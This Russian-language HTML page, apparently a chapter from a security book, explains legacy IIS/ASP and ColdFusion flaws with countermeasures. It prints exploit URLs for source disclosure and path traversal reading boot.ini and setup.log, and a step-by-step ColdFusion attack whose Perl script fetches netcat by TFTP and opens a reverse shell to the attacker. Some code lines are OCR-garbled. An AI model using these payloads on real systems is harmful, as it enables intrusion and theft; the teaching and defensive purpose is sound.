<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<html>
<head>
<title></title>
<meta http-equiv="Content-Type" content="text/html;charset=windows-1251">
</head>
<link rel="stylesheet" href="../STYLE.css">
<body TEXT="#000000" BGCOLOR="#E7E3E7" LINK="#004080" VLINK="#004080" olink="#008080" Background="">
<table BORDER=0   COLS=3 WIDTH="16%" >
  <tr> 
    <td><a href="Index5.html"><img SRC="Back.gif"  BORDER=0 ></a></td>
    <td WIDTH="10%"><a href="../menu.html"><img SRC="Menu.gif" BORDER=0 ></a></td>
    <td ALIGN=RIGHT><a href="Index7.html"><img SRC="For.gif" BORDER=0 ></a></td>
  </tr>
</table>

 
<br>
<table width="100%" border="0">
  <tr>
    <td class="Text_n">
 
<p class="Tit_CN">
Уязвимость активных страниц сервера</span></P>
<br>
<p class="Text_n">
Активные страницы сервера (ASP — Active Server Pages) представляют собой разработку компании Microsoft, аналогичную сценариям Perl и интерфейсу CG1 системы UNIX. Обычно написанный на языке VBScript, код ASP выполняет многое из того, что необходимо для поддержки состояния, обеспечения доступа к серверной части базы данных и отображения кода HTML в окне броузера. Одной из приятных особенностей страниц ASP является то, что они могут &quot;на лету&quot; генерировать страницы HTML. Другой малоприятной особенностью являются многочисленные изъяны страниц ASP, позволяющие взломщику просматривать их исходный код. Почему это плохо? Во-первых, потому, что взломщик, изучая логику программы, может обнаружить и другие изъяны. Во-вторых, он может найти в этих файлах такую важную информацию, как база данных имен и паролей пользователей.
<br>
<P align="center">
<span class="Text_b">
Ошибка ASP, связанная с интерпретацией точки</span></P>
<br>
<p class="Text_n">
Один из членов группы LOpht в 1997 году обнаружил ошибку, которая возникает, если одну или несколько точек поставить после адреса URL страницы ASP сервера IIS 3.0. При этом можно просмотреть исходный код ASP и проанализировать логику этой программы. Еще важнее то, что в данном файле можно найти такую важную информацию, как имена и пароли пользователей. Чтобы воспользоваться этой возможностью, нужно просто добавить точку после
URL.
<br>
<P align="center">
<span class="Text_b">
Контрмеры</span></P>
<br>
<p class="Text_n">
Хорошая новость заключается в том, что компания Microsoft выпустила модуль обновления для сервера IIS 3.0.&nbsp;
<br>

Однако имеется и плохая новость: выпушенный модуль обновления породил другой изъян. Замена в имени файла example, asp точки на ее шестнадцатеричное представление (0х2е) по-прежнему позволяет взломщику загрузить на свой компьютер файл с исходным кодом
ASP.&nbsp;
<br>
<P align="center">
<span class="Text_b">
Уязвимость ASP, связанная с альтернативными потоками данных</span></P>
<br>
<p class="Text_n">
Впервые об этом изъяне в бюллетене Bugtraq сообщил Пауль Эштон (Paul Ashton). В данном случае также можно загрузить исходный код страниц ASP. Этой возможностью легко воспользоваться, поэтому она стала довольно популярна среди новичков. Просто задайте URL в следующем формате.
<br>

<span class="Text_b">
http://192.168.51.101/scripts/file.asp::$DATA</span>
<br>

Если метод сработал, броузер Netscape попросит указать место, в котором нужно сохранить файл. Броузер Internet Explorer по умолчанию покажет исходный файл в диалоговом окне. После этого его можно сохранить и просматривать в любом текстовом редакторе.&nbsp;
<br>
<P align="center">
<span class="Text_b">
Контрмеры</span></P>
<br>
<p class="Text_n">
Для усиления защиты ограничьте доступ ко всем исходным файлам, отменив право на чтение для группы Everyone. В конце концов, для исходного код вполне достаточно разрешения на выполнение.
<br>
<P align="center">
<span class="Text_b">
Изъяны showcode. asp и codebrws. asp</span></P>
<br>
<p class="Text_n">
Рассмотрим еще один изъян, имеющий отношение к IIS 4.0, который связан с возможностью просмотра исходного кода ASP. Его отличие от рассмотренных выше ошибок заключается в том. что сам по себе этот изъян не является ошибкой, а представляет собой пример плохого программирования. Если в процессе установки сервера IIS 4.0 будут скопированы также файлы с примерами исходного кода ASP, то несколько плохо написанных файлов позволят взломщику загрузить на свой компьютер другие файлы. Проблема заключается в неспособности сценариев обрабатывать символы .., содержащиеся в пути к файлу. В следующем примере использование файла showcode.asp приведет к отображению файла boot.ini взламываемой системы (если доступ ограничен незначительно, то просмотреть можно любой файл).
<br>
<p class="Code">
http: //192.168. 51.101/msadc/Samples/<br>
SELECTOR/showcode. asp?source=/../../../../../boot.ini<br>
</p>

Точно так же, посредством файла codebrws.asp можно просмотреть любой файл, который находится на локальном диске. Как упоминалось в главе 13, можно попытаться найти файлы с расширением GIF программы pcAnywhere.
<br>
<p class="Code">
http://192.168.51.101/iissamples/exair/howitworks/<br>
codebrws.asp?source=/../../../../../winnt/repair/setup.log<br>
</p>
<p class="Prim">
 Изъяны showcode.asp и codebrws.asp невозможно использовать для корректной загрузки с целевого узла двоичных файлов. Причина заключается в том, что сценарий ASP обычно преобразовывает файлы. Преобразование такого файла, как SAM._, приведет к его повреждению и сделает его непригодным для использования. Однако это не помешает умелому хакеру восстановить структуру файла SAM и воспользоваться полученной информацией.
</p>
<P align="center">
<span class="Text_b">
Контрмеры против использования изъянов в
файлах АSР</span></P>
<br>
<p class="Text_n">
Рассмотренные выше проблемы можно решить, установив модуль обновления сервера IIS. Этот модуль, а также статью Q232449 из базы знаний компании Microsoft, можно найти по адресу<span class="Text_b"> ftp://ftp.microsoft.com/ bussys/IIS/iis-public/ fixes/usa/Viewcode-fix/</span>.
<br>
<P align="center">
<span class="Text_b">Изъян webhits.dll</span></P>
<br>
<p class="Text_n">
Ряд проблем, связанных с возможностью просмотра файлов, был выявлен группой CIS (Cerberus Information Security). Эти изъяны связаны с приложением ISAPI webhits.dll. Эта динамически подключаемая библиотека реализует механизм выделения информации в процессе функционирования MS Index Server. Однако ее наличие делает возможным взлом, при котором злоумышленник просматривает важные исходные коды ASP или другую информацию, содержащуюся на локальном диске. Первая из возможных атак начинается с использования существующего файла . HTW для просмотра исходного кода.
<br>

Вторая атака связана с передачей системе имени несуществующего файла. В качестве основы используется существующий файл и символы пробела (%20), число которых превышает 230, и которые расположены между именем реального файла (default.asp) и расширением . HTW. При этом информационные службы Internet игнорируют расширение (.HTW) и предоставляют в распоряжение взломщика любой файл системы:
<br>
<p class="Code">
http://192.168.51.101/default.asp%20%20%20%20%20%20%20%<br>
20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2<br>
0%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%<br>
20%20%20%20%20%20%20%20%20%20%20%2С%20%20%20 %20%20%20%<br>
20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%<br>
20%20% 20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%<br>
20%20%20%20%20%20%20%2 0%20%20%20%20%20%20%20%20%20%20%<br>
20%20%20%20%20%20%20%20%20%20%20%20%20 %20%20%20%20%20%<br>
20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%<br>
20%20%20%20%2С%20%20%20%20%20%20%20%20%20%20%20%20%20%<br>
20%20%20%20%20%2 0%20%20%20%20%20%20%20%20%20%20%20%20%<br>
20%20%20%20%20%20%20%20%20%20%20 %20%20%20%20%20%20%20%<br>
20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20% 20%20%<br>
20%20%20%20%20%20<br>
.htw?CiWebHitsFile=/../../../../../test.<br>
txt&amp;CiR estriction=none&amp;CiHiliteType=Full<br>
</p>

Третья .HTW-атака основана на использовании имени файла null.htw для помещения в окно броузера необработанного файла:
<br>
<p class="Code">
http://192.168.51.10I/null.htw?CiWebHitsFile=/../../../../../winnt/<br>
repair/setup.log&amp;CiRestriction=none&amp;CiHiliteType=Full<br>
</p>

Использование предыдущего адреса URL приведет к тому, что сервер IIS предоставит файл
/winnt/repair/setup.log.
 
<p class="Text_b">Контрмеры против использования изъянов библиотеки webhits.dll</span>
<br>
<p class="Text_n">
Для предотвращения использования рассмотренных атак удалите приложения, связанные с файлами с расширением . HTW. Для этого откройте диалоговое окно с основными свойствами уязвимого сервера, а затем для службы WWW Service щелкните на кнопке Edit. Далее перейдите во вкладку Home Directory и щелкните на кнопке Configuration из группы Application Settings. При этом на экране появится следующее диалоговое окно.


<p class="label"><IMG src="8.gif"><br>
</p>

 <p class="Text_n">
Затем выделите строку, в которой указано приложение, связанное с файлами . HTW, и щелкните на кнопке Remove. После этого Web-сервер больше не будет обращаться к библиотеке webhits .dll, и, таким образом, этот изъян будет устранен.


<p class="label"><IMG src="9.gif"  ><br>
</p>

 <p class="Text_n">
<P align="center">
<span class="Text_b">
Изъяны сервера ColdFusion</span></P>
<br>
<p class="Text_n">
Специалистами группы LOpht было обнаружено несколько существенных изъянов в сервере приложений Cold Fusion, позволяющих осуществлять удаленный запуск команд на уязвимом Web-сервере. В процессе установки этого программного продукта вместе с ним копируются также примеры кода и интерактивная документация. Причиной обнаруженных изъянов послужили несколько примеров, взаимодействие которых не ограничивается только локальным узлом.
<br>

Первая из проблем связана с устанавливаемым по умолчанию файлом opnfile.cfm. Этот файл позволяет взломщику загрузить на Web-сервер любой файл. Другой файл, displayopenedfile.cfm, помещает этот файл в окно броузера. Кроме того, exprcalc.cfm анализирует загруженный файл и удаляет его (во всяком случае, он для этого предназначен). Используя только файл openfile.cfm, можно ввести систему в заблуждение, чтобы она не удаляла загруженный файл, а затем выполнить локально любую команду. Чтобы воспользоваться этой возможностью, выполните следующие действия.
<br>

1.   Создайте файл, который при загрузке на удаленный Web-сервер приведет к выполнению локальной команды. Например, можно воспользоваться следующим сценарием Perl с именем test.pl.
<br>
<p class="Code">
systemC'tftp -i 192.168.51.100 GET nc.exe&quot;);<br>
system(&quot;nc-e cmd.exe 192.168.51.100   3000&quot;);<br>
</p>

Этот метод сработает в том случае, если на сервере Cold Fusion установлен интерпретатор языка Perl.
<br>

2.  Задайте в броузере следующий адрес URL.
<br>
<p class="Code">
http://192.168.51.101/cfdocs/expeval/openfile.cfm<br>
</p>
 <p class="Text_n">
3.  Укажите в поле Open File путь к созданному файлу и щелкните на кнопке ОК.


4.   В адресе URL замените строку D:\INETPUB\WWWROOT\cfdocs\expeval\test.pl на полное имя файла exprcalc.cfm (с указанием пути), предназначенного для удаления загруженных в систему файлов. После внесения изменений URL должен выглядеть следующим образом.
<br>
<p class="Code">
http://192.168.51.101/cfdoce/expeval/ExprCalc.cfra?RequestTimeout=<br>
2000&amp;OpenFilePath-D:\lNETPOB\WWWROOT\cfdocs\expeval\exprcalc.cfm<br>
</p>

5.   В окне должно появиться содержимое файла exprcalc. cfm и он должен быть удален из системы. После этого все файлы, загруженные с помощью openfile.cfm, будут оставаться в удаленной системе.
<br>

6.   Проделав еще раз описанные действия, загрузите повторно файл test.pl на удаленную систему. После этого данный файл (test.pl) будет ожидать вызова.
<br>

7.  С помощью следующего URL запустите файл test.pl. http://192.168.51.101/cfdocs/expeval/test.pl
<br>

8.  Если перед этим были запущены сервер TFTP и утилита netcat, то должно появиться следующее приглашение (т.е. командная строка, позволяющая выполнять команды с правами администратора).&nbsp;
<br>
<p class="Code">
 С:\&gt;пс -1  -р 3000<br>
 Microsoft(R) Windows NT(TM)<br>
 (С) Copyright 1985-1996 Microsoft Corp.<br>
 D:\INETPUB\WWWROOT\cfdocs&gt;<br>
</p>
<P align="center">
<span class="Text_b">
Контрмеры против использования изъянов сервера Cold Fusion</span></P>
<br>
<p class="Text_n">
Для того чтобы предотвратить возможность использования изъянов Cold Fusion, можно воспользоваться двумя способами:
<br>
<ul>
  <li>&nbsp;Удалите все уязвимые сценарии.</li>
  <li>&nbsp;Примените к файлу exprcalc.cfm модуль обновления, который можно найти по адресу
    http://wwwl.allaire.com/handlers/index.cfm?ID=8727&amp;Method=Full.</li>
</ul>

<br>


</p></td>
  </tr>
</table>
<br>
<table BORDER=0  COLS=3 WIDTH="11%" >
  <tr> 
   <td><a href="Index5.html"><img SRC="Back.gif"  BORDER=0 ></a></td>
    <td WIDTH="10%"><a href="../menu.html"><img SRC="Menu.gif" BORDER=0 ></a></td>
    <td ALIGN=RIGHT><a href="Index7.html"><img SRC="For.gif" BORDER=0 ></a></td>
   
  </tr>
</table>
</body>
</html>


</body>
</html>
